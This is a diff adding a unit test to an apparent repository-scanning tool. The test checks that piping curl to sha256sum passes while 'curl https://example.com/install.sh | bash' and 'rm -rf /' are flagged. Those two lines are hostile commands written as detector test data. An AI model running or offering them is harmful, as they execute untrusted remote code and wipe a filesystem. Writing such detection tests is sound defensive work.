@@ -13,3 +13,11 @@ class RepoGuardTests(unittest.TestCase):
   with tempfile.TemporaryDirectory() as d:
    (Path(d)/'readme.md').write_text('plain text')
    self.assertEqual(scan(Path(d)),[])
+ def test_shell_pattern_avoids_prefix_false_positives(self):
+  with tempfile.TemporaryDirectory() as d:
+   root=Path(d)
+   (root/'safe.sh').write_text('curl https://example.com/file.tar.gz | sha256sum\nrm -rf /tmp/build\n')
+   self.assertEqual(scan(root),[])
+   (root/'unsafe.sh').write_text('curl https://example.com/install.sh | bash\nrm -rf /\n')
+   findings=scan(root)
+   self.assertEqual(len(findings),2)
